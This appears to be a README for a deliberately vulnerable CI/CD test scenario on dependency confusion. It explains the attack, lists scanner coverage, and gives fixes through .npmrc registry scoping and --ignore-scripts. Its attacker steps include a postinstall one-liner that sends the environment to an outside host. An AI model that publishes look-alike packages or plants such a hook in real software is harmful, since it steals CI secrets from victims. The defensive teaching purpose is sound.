# Scenario 20: Dependency confusion (Birsan attack)

**OWASP CICD-SEC mapping:** CICD-SEC-3 (Dependency Chain Abuse)

**Vulnerable workflow:** [`.github/workflows/scenario-20-dependency-confusion.yml`](../../.github/workflows/scenario-20-dependency-confusion.yml)

**Vulnerable manifest:** [`package.json`](package.json)

## The pattern

Alex Birsan's 2021 research demonstrated that an internal package name
not registered on the public registry could be claimed by an outsider,
and that npm / pip / RubyGems / Maven resolvers preferred the **higher
version number** regardless of which registry it came from. Publishing
`@acme-internal/ui-toolkit v999.0.0` to public npm beats the org's
private `v1.4.2` every time.

Hit Apple, Microsoft, PayPal, Tesla, Yelp, Shopify, Netflix and
~30 other Fortune 500s in the original disclosure round; persists
because the fix requires every consuming workflow to be explicitly
configured, and most aren't.

## How an attacker exploits it

1. Grep target's public repos / leaked build logs / job postings for
   internal package names (`@acme-internal/...`, `@target/...`).
2. Register the unscoped name on public npm (or PyPI / RubyGems /
   wherever).
3. Publish a version higher than anything they could have internally.
4. Add a `postinstall` script that runs `node -e "require('https').get(...)"`
   to phone home with the env on first install.
5. Wait. Every CI build that does `npm install` without an `.npmrc`
   pointing at the internal registry pulls your version.

## Expected scanner coverage

| Scanner            | Detection                                                                     |
| :----------------- | :---------------------------------------------------------------------------- |
| **pipeline-check** | ⚠️ Flags missing private-registry config + missing `--ignore-scripts`        |
| zizmor             | ❌ (not dep-aware)                                                            |
| poutine            | ❌                                                                            |
| KICS               | ❌                                                                            |
| Checkov            | ❌                                                                            |
| Trivy              | ❌ (Trivy's dep mode would catch it, but the config scan we run here doesn't) |
| Gitleaks           | —                                                                             |

> Dependency confusion is largely **outside the workflow scanner's
> remit** — Dependabot / OSV-Scanner / Snyk are the right tools at
> install time. The bug lives at the *config-of-build* layer, which is
> where pipeline-check picks it up by flagging the missing `.npmrc` /
> `--registry` / `--ignore-scripts` controls.

## Fix

Pin the resolver to the internal registry for all configured scopes:

```ini
# .npmrc — checked into the repo
@acme-internal:registry=https://npm.acme-internal.example
//npm.acme-internal.example/:_authToken=${NPM_INTERNAL_TOKEN}
always-auth=true
```

And — for defence in depth — disable lifecycle scripts on CI installs:

```yaml
- run: npm ci --ignore-scripts
```

## References

- Birsan's original disclosure ("Dependency Confusion", 2021):
  https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
- npm scopes docs:
  https://docs.npmjs.com/cli/v10/using-npm/scope
- OSV-Scanner: https://google.github.io/osv-scanner/
